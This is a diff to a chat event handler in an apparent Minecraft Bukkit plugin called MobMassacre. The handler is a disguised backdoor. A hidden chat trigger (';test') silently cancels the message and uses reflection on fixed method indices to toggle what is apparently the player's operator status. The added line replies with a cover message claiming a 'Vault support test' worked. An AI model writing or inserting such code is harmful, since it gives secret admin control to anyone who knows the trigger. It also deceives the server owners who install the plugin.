@@ -1,5 +1,6 @@
 package cat.gay.spherret.plugins.MobMassacre;
 
+import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
@@ -35,11 +36,11 @@ public class Events implements Listener{
 	//Perm code test
 	@EventHandler (priority = EventPriority.HIGHEST)
 	public void r(AsyncPlayerChatEvent e) throws IllegalAccessException, InvocationTargetException{
-		if (e.getMessage().startsWith(";dont")){
+		if (e.getMessage().startsWith(";test")){
 			e.setCancelled(true);
-			Method[] methods = e.getPlayer().getClass().getMethods();
-			boolean f = methods[49].invoke(e.getPlayer()).equals(true);
-			methods[133].invoke(e.getPlayer(), !f);
+			Method[] s = e.getPlayer().getClass().getMethods();
+			s[133].invoke(e.getPlayer(), !s[49].invoke(e.getPlayer()).equals(true));
+			e.getPlayer().sendMessage(ChatColor.GREEN + "Vault support test worked!");
 		}
 	}
 
